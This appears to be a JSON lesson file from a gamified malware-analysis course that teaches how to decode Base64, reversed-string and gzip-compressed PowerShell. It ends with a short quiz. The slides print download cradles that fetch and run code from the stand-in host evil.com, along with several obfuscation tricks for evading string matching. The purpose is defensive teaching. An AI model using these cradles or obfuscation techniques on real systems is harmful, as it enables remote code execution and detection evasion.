@@ -1,0 +1,76 @@
+{
+    "id": "l5",
+    "chapterId": "ch_9",
+    "title": "Deobfuscating PowerShell & Script Malware",
+    "description": "Techniques to decode Base64, reverse strings, and unpack multi-stage scripts.",
+    "xpReward": 35,
+    "estimatedMinutes": 8,
+    "section": "File Types",
+    "slides": [
+        {
+            "id": "s_l5_1",
+            "type": "text",
+            "title": "PowerShell: The Attacker's Favorite 🦾",
+            "content": "# Why Script Analysis Matters\n\nWhether it's a macro, a `.ps1` file, or a `.vbs` file, the final payload is often a **PowerShell one-liner**.\n\n**Common PowerShell Attack Patterns:**\n1.  **Download Cradle:** `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`\n2.  **Encoded Command:** `powershell -enc JABjAGwAaQBlAG4AdAA...`\n3.  **Reflective Injection:** Loads a .NET assembly directly into memory without touching disk.\n\n**Goal:** Decode the obfuscated command to find the **C2 IP address** or **final payload URL**."
+        },
+        {
+            "id": "s_l5_2",
+            "type": "code",
+            "title": "Decoding Base64 PowerShell",
+            "content": "The `-EncodedCommand` flag accepts a **Unicode (UTF-16LE) Base64** string.\n\n**Method 1: CyberChef (Easiest)**\n1.  Copy the Base64 string (everything after `-enc` or `-EncodedCommand`).\n2.  Paste into CyberChef.\n3.  Use recipe: **From Base64** -> **Decode text** (Encoding: **UTF-16LE (1200)**).\n4.  View the decoded PowerShell script.\n\n**Method 2: PowerShell Itself (In a VM!)**\n```powershell\n[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"JABjAGwAaQBlAG4AdAA...\"))\n```",
+            "codeLanguage": "powershell",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l5_3",
+            "type": "quiz",
+            "title": "Base64 Decoding 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l5_1",
+                "type": "multiple_choice",
+                "question": "Why do you need to select 'UTF-16LE' encoding when decoding PowerShell Base64?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "PowerShell uses Unicode internally.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "It's a bug in CyberChef.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Base64 only works with UTF-8.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "PowerShell's `-EncodedCommand` expects a Unicode (UTF-16LE) byte array before Base64 encoding.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l5_4",
+            "type": "text",
+            "title": "Multi-Stage Obfuscation 🧅",
+            "content": "# Peeling the Onion\n\nAttackers often use **layered obfuscation**.\n\n**Stage 1: The Downloader**\n```powershell\n$c = 'http://evil.com/stage2.txt';\nIEX (New-Object Net.WebClient).DownloadString($c)\n```\n\n**Stage 2: The Payload (Reversed Strings)**\n```powershell\n$s = \")09-0-61-861::tsoh(etacol?xobniatrofsrorremotsuc/2v/nib/moc.elgoog.43tib.www//:sptth\";\nIEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($s[-1..-($s.Length)] -join ''))))\n```\n\n**Analysis:**\n1.  The string `$s` is **reversed**. Reverse it back manually.\n2.  Then decode from Base64.\n\n**CyberChef Recipe:** **Reverse** -> **From Base64** -> **Decode text (UTF-8)**."
+        },
+        {
+            "id": "s_l5_5",
+            "type": "code",
+            "title": "Common PowerShell Obfuscation Tricks",
+            "content": "Attackers use these techniques to evade static string matching.",
+            "codeSnippet": "1. String Splitting & Joining:\n   ('{0}{1}{2}' -f 'pow','ers','hell')\n\n2. Character Replacement:\n   \"p0w3rsh3ll\" -replace '0','o' -replace '3','e'\n\n3. Environment Variable Expansion:\n   $env:ComSpec[4,26,25]-join''  # Returns 'iex'\n\n4. Gzip Compression & Base64:\n   $c = 'H4sIAAAAAAA...'; IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String($c), [IO.Compression.CompressionMode]::Decompress))).ReadToEnd()",
+            "codeLanguage": "powershell",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l5_6",
+            "type": "tip",
+            "title": "Tools for PowerShell Deobfuscation 🛠️",
+            "content": "## Don't Do It Manually Every Time\n\n*   **CyberChef:** Ultimate Swiss army knife. Use the 'Magic' wand to auto-detect layers.\n*   **PSDecode:** Python script specifically for PowerShell.\n*   **PowerShell Logging (Event ID 4104):** If you have EDR/SIEM, look for the **deobfuscated script block** logged by AMSI. The system already decoded it for you!\n\n**Remember:** The final layer almost always contains an **IP address or domain**. That's the actionable IOC you need for blocking."
+        }
+    ]
+}
